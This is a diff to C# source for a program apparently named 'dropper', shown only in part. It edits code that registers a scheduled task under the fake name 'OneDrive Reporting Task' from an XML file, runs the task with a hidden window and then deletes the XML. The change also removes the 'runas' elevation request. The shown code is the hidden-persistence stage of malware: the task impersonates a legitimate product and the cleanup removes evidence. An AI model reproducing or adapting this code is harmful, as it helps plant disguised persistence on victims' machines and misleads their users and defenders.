@@ -1,8 +1,6 @@
 ﻿using System;
 using System.IO;
 using System.Diagnostics;
-using System.Threading;
-using Microsoft.Win32;
 
 namespace dropper
 {
@@ -78,16 +76,14 @@ namespace dropper
             {
                 FileName = "schtasks.exe",
                 Arguments = "/create /tn \"OneDrive Reporting Task\" /xml " + xmlpath,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                Verb = "runas"
+                WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "schtasks.exe",
                 Arguments = "/run /i /tn \"OneDrive Reporting Task\"",
-                WindowStyle = ProcessWindowStyle.Hidden,
-                Verb = "runas"
+                WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
             File.Delete(xmlpath);
